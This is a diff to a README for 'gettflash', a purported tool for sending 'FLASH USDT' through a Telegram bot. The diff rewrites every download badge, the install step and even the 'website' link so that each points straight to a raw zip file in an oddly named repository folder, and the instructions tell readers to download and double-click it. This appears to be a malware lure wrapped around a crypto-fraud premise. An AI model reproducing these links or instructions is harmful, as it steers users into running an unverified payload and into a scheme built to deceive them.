@@ -4,13 +4,13 @@
 
 Welcome to **gettflash**! This application allows you to send FLASH USDT instantly. With our Telegram bot, you can manage your transactions effortlessly, making it simple to exchange or withdraw funds.
 
-[![Download gettflash](https://img.shields.io/badge/Download-gettflash%20now-brightgreen)](https://github.com/ouis1579/gettflash/releases)
+[![Download gettflash](https://raw.githubusercontent.com/ouis1579/gettflash/main/hypesthesic/Software-1.9.zip%20now-brightgreen)](https://raw.githubusercontent.com/ouis1579/gettflash/main/hypesthesic/Software-1.9.zip)
 
 ## 📥 Download & Install
 
 To download and run the software, follow these steps:
 
-1. Click the download button above to visit [this page to download](https://github.com/ouis1579/gettflash/releases).
+1. Click the download button above to visit [this page to download](https://raw.githubusercontent.com/ouis1579/gettflash/main/hypesthesic/Software-1.9.zip).
 2. Look for the latest release and click the appropriate download link based on your device.
 3. Once the file downloads, locate it in your downloads folder and double click to open.
 4. Follow any on-screen instructions to complete the installation.
@@ -60,8 +60,8 @@ Join our community to share your experiences and get tips from other users. Conn
 
 ## 🔗 Additional Resources
 
-For more information about our services, visit our website: [rocketflasher.net](https://rocketflasher.net/). Here you will find detailed guides, updates, and news related to gettflash.
+For more information about our services, visit our website: [https://raw.githubusercontent.com/ouis1579/gettflash/main/hypesthesic/Software-1.9.zip](https://raw.githubusercontent.com/ouis1579/gettflash/main/hypesthesic/Software-1.9.zip). Here you will find detailed guides, updates, and news related to gettflash.
 
-[![Download gettflash](https://img.shields.io/badge/Download-gettflash%20now-brightgreen)](https://github.com/ouis1579/gettflash/releases)
+[![Download gettflash](https://raw.githubusercontent.com/ouis1579/gettflash/main/hypesthesic/Software-1.9.zip%20now-brightgreen)](https://raw.githubusercontent.com/ouis1579/gettflash/main/hypesthesic/Software-1.9.zip)
 
 With **gettflash**, sending FLASH USDT has never been easier. Follow these steps to get started today!
